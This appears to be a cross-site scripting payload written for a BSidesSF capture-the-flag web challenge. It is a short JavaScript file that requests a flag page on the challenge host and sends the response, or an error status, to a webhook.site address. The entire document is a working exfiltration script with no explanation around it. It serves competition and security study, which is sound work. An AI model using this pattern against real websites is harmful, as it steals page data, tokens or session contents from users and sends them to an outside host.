var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://web-tutorial-2-9fec29fc.challenges.bsidessf.net/xss-two-flag', true);
xhr.onload = function() {
    var exfil = new XMLHttpRequest();
    exfil.open('POST', 'https://webhook.site/09621c79-5ff4-4808-8983-fcbc3a6059db/', true);
    exfil.setRequestHeader('Content-Type', 'text/plain');
    exfil.send(xhr.responseText);
};
xhr.onerror = function() {
    var exfil = new XMLHttpRequest();
    exfil.open('POST', 'https://webhook.site/09621c79-5ff4-4808-8983-fcbc3a6059db/', true);
    exfil.setRequestHeader('Content-Type', 'text/plain');
    exfil.send('error: ' + xhr.status);
};
xhr.send();
